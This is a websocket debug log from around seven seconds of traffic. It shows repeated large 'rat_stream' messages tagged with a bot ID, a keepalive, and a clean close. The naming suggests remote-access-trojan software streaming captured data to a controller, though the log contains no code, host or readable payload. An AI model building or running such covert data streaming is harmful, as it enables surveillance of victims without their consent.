2026-08-22 18:56:14,436 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399774.435054}' [140752 bytes]
2026-08-22 18:56:14,780 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...amp": 1787399774.77941}' [140751 bytes]
2026-08-22 18:56:15,122 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399775.122485}' [140752 bytes]
2026-08-22 18:56:15,466 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399775.4654393}' [142641 bytes]
2026-08-22 18:56:15,806 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399775.8051486}' [142641 bytes]
2026-08-22 18:56:16,151 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399776.1503925}' [142641 bytes]
2026-08-22 18:56:16,346 - DEBUG - > PING e8 d7 2f ae [binary, 4 bytes]
2026-08-22 18:56:16,346 - DEBUG - % sent keepalive ping
2026-08-22 18:56:16,413 - DEBUG - < PONG e8 d7 2f ae [binary, 4 bytes]
2026-08-22 18:56:16,413 - DEBUG - % received keepalive pong
2026-08-22 18:56:16,490 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...tamp": 1787399776.4908}' [142638 bytes]
2026-08-22 18:56:16,832 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399776.8326774}' [142641 bytes]
2026-08-22 18:56:17,178 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399777.1772141}' [142641 bytes]
2026-08-22 18:56:17,523 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399777.523066}' [140852 bytes]
2026-08-22 18:56:17,866 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399777.866267}' [105668 bytes]
2026-08-22 18:56:18,213 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399778.2132266}' [105661 bytes]
2026-08-22 18:56:18,550 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399778.5508025}' [105697 bytes]
2026-08-22 18:56:18,893 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399778.892121}' [105696 bytes]
2026-08-22 18:56:19,237 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399779.236642}' [105696 bytes]
2026-08-22 18:56:19,592 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399779.591199}' [105696 bytes]
2026-08-22 18:56:19,937 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399779.9379075}' [105865 bytes]
2026-08-22 18:56:20,288 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399780.288061}' [129856 bytes]
2026-08-22 18:56:20,640 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399780.6407425}' [129865 bytes]
2026-08-22 18:56:20,982 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399780.9829638}' [129865 bytes]
2026-08-22 18:56:21,329 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399781.3294137}' [166641 bytes]
2026-08-22 18:56:21,590 - DEBUG - > CLOSE 1000 (OK) [2 bytes]
2026-08-22 18:56:21,590 - DEBUG - = connection is CLOSING
2026-08-22 18:56:21,674 - DEBUG - < CLOSE 1000 (OK) [2 bytes]
2026-08-22 18:56:21,674 - DEBUG - > EOF
2026-08-22 18:56:21,674 - DEBUG - = connection is CLOSED
2026-08-22 18:56:21,674 - DEBUG - x closing TCP connection
2026-08-22 18:56:21,676 - ERROR - Stream error: sent 1000 (OK); then received 1000 (OK)
